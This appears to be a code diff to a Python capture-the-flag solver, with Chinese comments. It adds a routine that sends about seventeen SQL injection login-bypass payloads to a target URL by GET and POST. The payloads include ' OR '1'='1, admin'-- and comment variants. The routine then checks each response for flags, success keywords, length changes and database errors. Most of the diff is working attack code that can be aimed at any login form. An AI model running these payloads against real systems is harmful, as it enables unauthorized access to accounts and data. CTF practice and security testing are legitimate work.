@@ -196,6 +196,18 @@ class CTFSolver:
         """尝试手动payload"""
         import requests
         
+        # 首先尝试万能密码注入
+        print("\n🔑 尝试万能密码注入...")
+        universal_password_success = await self._try_universal_password_injection(
+            target_url, results, username_param, password_param
+        )
+        
+        if universal_password_success:
+            return
+        
+        # 如果万能密码失败，尝试其他payload
+        print("\n🔧 尝试其他SQL注入payload...")
+        
         # 常见SQL注入payload
         payloads = [
             # 联合查询payload
@@ -215,11 +227,6 @@ class CTFSolver:
             
             # 时间盲注payload
             f"admin' AND sleep(5)--",
-            
-            # 万能密码
-            f"' OR '1'='1",
-            f"' OR 1=1--",
-            f"admin' OR '1'='1'--",
         ]
         
         print(f"尝试 {len(payloads)} 个手动payload...")
@@ -256,6 +263,129 @@ class CTFSolver:
             
             except Exception as e:
                 print(f"  Payload {i+1}: 错误 - {e}")
+    
+    async def _try_universal_password_injection(self, target_url, results, username_param, password_param):
+        """尝试万能密码注入"""
+        import requests
+        
+        # 万能密码payload列表
+        universal_passwords = [
+            # 经典万能密码
+            {"username": "admin", "password": "' OR '1'='1"},
+            {"username": "admin", "password": "' OR 1=1--"},
+            {"username": "admin", "password": "' OR 'a'='a"},
+            {"username": "admin", "password": "' OR ''='"},
+            
+            # 变体
+            {"username": "' OR '1'='1", "password": "anything"},
+            {"username": "admin' OR '1'='1'--", "password": "anything"},
+            {"username": "admin'--", "password": "anything"},
+            {"username": "admin'#", "password": "anything"},
+            
+            # 双引号变体
+            {"username": "admin", "password": '" OR "1"="1'},
+            {"username": '" OR "1"="1', "password": "anything"},
+            
+            # 无引号变体
+            {"username": "admin", "password": " OR 1=1"},
+            {"username": " OR 1=1", "password": "anything"},
+            
+            # 管理员万能密码
+            {"username": "admin", "password": "admin' OR '1'='1"},
+            {"username": "administrator", "password": "' OR '1'='1"},
+            
+            # 注释变体
+            {"username": "admin'/*", "password": "*/ OR '1'='1"},
+            {"username": "admin'-- -", "password": "anything"},
+            {"username": "admin'#", "password": "anything"},
+        ]
+        
+        print(f"尝试 {len(universal_passwords)} 个万能密码组合...")
+        
+        for i, creds in enumerate(universal_passwords):
+            try:
+                # 构建请求参数
+                params = {
+                    username_param: creds["username"],
+                    password_param: creds["password"]
+                }
+                
+                # 尝试GET请求
+                response = requests.get(target_url, params=params, timeout=10)
+                
+                # 检查响应中是否包含flag
+                import re
+                flag_patterns = [
+                    r'flag\{[^}]+\}',
+                    r'FLAG\{[^}]+\}',
+                    r'ctf\{[^}]+\}',
+                    r'CTF\{[^}]+\}',
+                    r'登录成功|登录成功|success|welcome|dashboard|admin',
+                ]
+                
+                # 检查flag
+                for pattern in flag_patterns[:4]:  # 只检查flag模式
+                    match = re.search(pattern, response.text, re.IGNORECASE)
+                    if match:
+                        flag = match.group()
+                        print(f"\n🎉 使用万能密码组合 {i+1} 找到Flag: {flag}")
+                        results["flags_found"].append(flag)
+                        results["success"] = True
+                        results["phases_completed"].append("universal_password_injection")
+                        
+                        # 记录使用的payload
+                        results["universal_password_used"] = {
+                            "username": creds["username"],
+                            "password": creds["password"]
+                        }
+                        return True
+                
+                # 检查登录成功迹象
+                success_keywords = ["登录成功", "登录成功", "success", "welcome", "dashboard", "admin", "logout", "退出"]
+                if any(keyword in response.text.lower() for keyword in [k.lower() for k in success_keywords]):
+                    print(f"  ✓ 万能密码组合 {i+1}: 可能登录成功")
+                    
+                    # 尝试POST请求（如果GET失败）
+                    try:
+                        post_response = requests.post(target_url, data=params, timeout=10)
+                        
+                        # 再次检查flag
+                        for pattern in flag_patterns[:4]:
+                            match = re.search(pattern, post_response.text, re.IGNORECASE)
+                            if match:
+                                flag = match.group()
+                                print(f"\n🎉 使用POST请求找到Flag: {flag}")
+                                results["flags_found"].append(flag)
+                                results["success"] = True
+                                results["phases_completed"].append("universal_password_injection")
+                                
+                                # 记录使用的payload
+                                results["universal_password_used"] = {
+                                    "username": creds["username"],
+                                    "password": creds["password"],
+                                    "method": "POST"
+                                }
+                                return True
+                    except:
+                        pass
+                
+                # 检查响应长度变化（可能表示成功）
+                if i == 0:
+                    baseline_length = len(response.text)
+                else:
+                    current_length = len(response.text)
+                    if abs(current_length - baseline_length) > 100:  # 响应长度显著变化
+                        print(f"  ⚠️  万能密码组合 {i+1}: 响应长度变化 ({baseline_length} -> {current_length})")
+                        
+                        # 检查是否有数据库错误信息
+                        error_keywords = ["mysql", "sql", "syntax", "error", "warning", "exception"]
+                        if any(keyword in response.text.lower() for keyword in error_keywords):
+                            print(f"    发现数据库错误信息，可能存在SQL注入")
+            
+            except Exception as e:
+                print(f"  ✗ 万能密码组合 {i+1}: 错误 - {e}")
+        
+        return False
     
     async def _generate_report(self, results):
         """生成解题报告"""
